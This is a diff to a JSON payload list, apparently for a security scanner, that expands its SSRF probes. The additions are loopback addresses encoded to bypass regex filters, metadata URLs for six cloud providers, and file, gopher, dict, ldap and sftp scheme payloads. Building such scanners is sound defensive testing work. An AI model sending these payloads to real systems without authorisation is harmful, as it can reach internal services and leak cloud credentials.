@@ -6,18 +6,27 @@
       {"payload": "http://127.0.0.1",          "description": "IPv4 loopback", "confidence_hint": 95},
       {"payload": "http://localhost",          "description": "DNS loopback", "confidence_hint": 90},
       {"payload": "http://[::1]",              "description": "IPv6 loopback", "confidence_hint": 85},
-      {"payload": "http://127.1",              "description": "Short IPv4", "confidence_hint": 80, "description_extra": "Bypass simple filter"}
+      {"payload": "http://127.1",              "description": "Short IPv4", "confidence_hint": 80, "description_extra": "Bypass simple filter"},
+      {"payload": "http://2130706433/",        "description": "IPv4 en décimal (bypass filtre regex)", "confidence_hint": 75, "depth": "extended"},
+      {"payload": "http://0177.0.0.1/",        "description": "IPv4 en octal (bypass filtre regex)", "confidence_hint": 75, "depth": "extended"},
+      {"payload": "http://[::ffff:127.0.0.1]", "description": "IPv4-mapped IPv6 (bypass filtre regex)", "confidence_hint": 75, "depth": "extended"}
     ],
     "metadata": [
       {"payload": "http://169.254.169.254/latest/meta-data/",    "description": "AWS metadata", "confidence_hint": 95},
-      {"payload": "http://metadata.google.internal/",            "description": "GCP metadata", "confidence_hint": 95},
-      {"payload": "http://169.254.169.254/metadata/v1/",         "description": "Azure metadata", "confidence_hint": 90}
+      {"payload": "http://metadata.google.internal/",            "description": "GCP metadata", "confidence_hint": 95, "depth": "aggressive"},
+      {"payload": "http://169.254.169.254/metadata/v1/",         "description": "Azure metadata", "confidence_hint": 90, "depth": "aggressive"},
+      {"payload": "http://100.100.100.200/latest/meta-data/",    "description": "Alibaba Cloud (ECS) metadata", "confidence_hint": 85, "depth": "aggressive"},
+      {"payload": "http://169.254.169.254/metadata/v1.json",     "description": "DigitalOcean (Droplet) metadata", "confidence_hint": 85, "depth": "aggressive"},
+      {"payload": "http://169.254.169.254/opc/v1/instance/",     "description": "Oracle Cloud (OCI) metadata v1 (sans header requis)", "confidence_hint": 85, "depth": "aggressive"}
     ],
     "schemes": [
       {"payload": "file:///etc/hostname",  "description": "File scheme (Linux)", "confidence_hint": 90},
       {"payload": "file:///c:/windows/win.ini", "description": "File scheme (Windows)", "confidence_hint": 90},
-      {"payload": "gopher://127.0.0.1:25/", "description": "Gopher exotic", "confidence_hint": 70},
-      {"payload": "dict://127.0.0.1:6379/info", "description": "Redis info via dict", "confidence_hint": 85}
+      {"payload": "gopher://127.0.0.1:25/", "description": "Gopher exotic", "confidence_hint": 70, "depth": "aggressive"},
+      {"payload": "dict://127.0.0.1:6379/info", "description": "Redis info via dict", "confidence_hint": 85, "depth": "aggressive"},
+      {"payload": "ftp://127.0.0.1/", "description": "FTP scheme — sonde un service non-HTTP", "confidence_hint": 60, "depth": "extended"},
+      {"payload": "ldap://127.0.0.1/", "description": "LDAP scheme exotique", "confidence_hint": 65, "depth": "aggressive"},
+      {"payload": "sftp://127.0.0.1:22/", "description": "SFTP scheme exotique", "confidence_hint": 60, "depth": "aggressive"}
     ]
   }
 }
